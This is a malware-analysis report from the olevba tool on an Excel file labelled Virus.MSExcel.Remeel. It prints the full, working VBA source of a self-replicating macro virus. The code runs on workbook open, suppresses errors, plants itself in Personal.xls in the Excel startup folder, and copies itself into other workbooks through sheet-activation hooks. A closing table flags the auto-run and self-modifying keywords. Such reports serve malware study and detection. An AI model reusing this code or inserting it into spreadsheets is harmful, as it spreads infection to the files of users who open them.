olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Remeel-5c83eb0da6ffb3134604280a9060b10385d5b0a9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Remeel-5c83eb0da6ffb3134604280a9060b10385d5b0a9 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Compare Text
Private Sub Workbook_Open()
'Remeel
On Error Resume Next
With Application: p$ = "Personal.xls": a$ = ActiveWorkbook.Name
.ScreenUpdating = False: sp$ = .StartupPath: PerEx$ = Dir(sp$ & "\" & p)
Set avi = Workbooks(a$).VBProject.VBComponents.Item(1)
Set pvi = Workbooks(p$).VBProject.VBComponents.Item(1)

j% = 1: Do While pvi.CodeModule.Lines(1, 1) = "": pvi.CodeModule.DeleteLines 1: j% = j% + 1
If j% = 5 Then Exit Do
Loop
k% = 1: Do While avi.CodeModule.Lines(1, 1) = "": avi.CodeModule.DeleteLines 1: k% = k% + 1
If k% = 5 Then Exit Do
Loop

If PerEx$ = p Then
  If Workbooks(p).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Remeel" Then
  E% = 6
  Else
    If Workbooks(a).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Remeel" Then E% = 7 Else E% = 8 '‡B�AComplete
  End If
Else: E% = 5
End If
Select Case E%: Case 5
  n1$ = ActiveWorkbook.Name: Workbooks.Add: ActiveWorkbook.SaveAs (sp$ & "\" & p)
  ActiveWindow.Visible = False: Workbooks(p).Save: T1 p, a
Case 6: T1 p, a
Case 7: n$ = Workbooks(p$).VBProject.VBComponents.Item(1).Name
.OnSheetActivate = "Personal.xls!" & n$ & ".t2"
End Select
End With
End Sub
Private Sub T1(p$, a$)
y% = 1
Set avi = Workbooks(a$).VBProject.VBComponents.Item(1)
Set pvi = Workbooks(p$).VBProject.VBComponents.Item(1)
Do: pvi.CodeModule.InsertLines y%, avi.CodeModule.Lines(y%, 1)
y% = y% + 1: Loop While avi.CodeModule.Lines(y%, 1) <> "'MsgBox"
pvi.CodeModule.InsertLines y%, "'MsgBox": Workbooks(p).Save
End Sub
Private Sub T2()
y% = 1: p$ = "Personal.xls": a$ = ActiveWorkbook.Name
If a$ = "Book1" Then Exit Sub
Set avi = Workbooks(a$).VBProject.VBComponents.Item(1)
Set pvi = Workbooks(p$).VBProject.VBComponents.Item(1)
If avi.CodeModule.Lines(3, 1) = "'Remeel" Then Exit Sub
Do: avi.CodeModule.InsertLines y, pvi.CodeModule.Lines(y%, 1)
y% = y% + 1: Loop While pvi.CodeModule.Lines(y%, 1) <> "'MsgBox"
avi.CodeModule.InsertLines y, "'MsgBox": Workbooks(a$).Save: Application.OnSheetActivate = ""
End Sub
'MsgBox
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Remeel-5c83eb0da6ffb3134604280a9060b10385d5b0a9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Remeel-5c83eb0da6ffb3134604280a9060b10385d5b0a9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Remeel-5c83eb0da6ffb3134604280a9060b10385d5b0a9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Remeel-5c83eb0da6ffb3134604280a9060b10385d5b0a9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Remeel-5c83eb0da6ffb3134604280a9060b10385d5b0a9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Remeel-5c83eb0da6ffb3134604280a9060b10385d5b0a9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

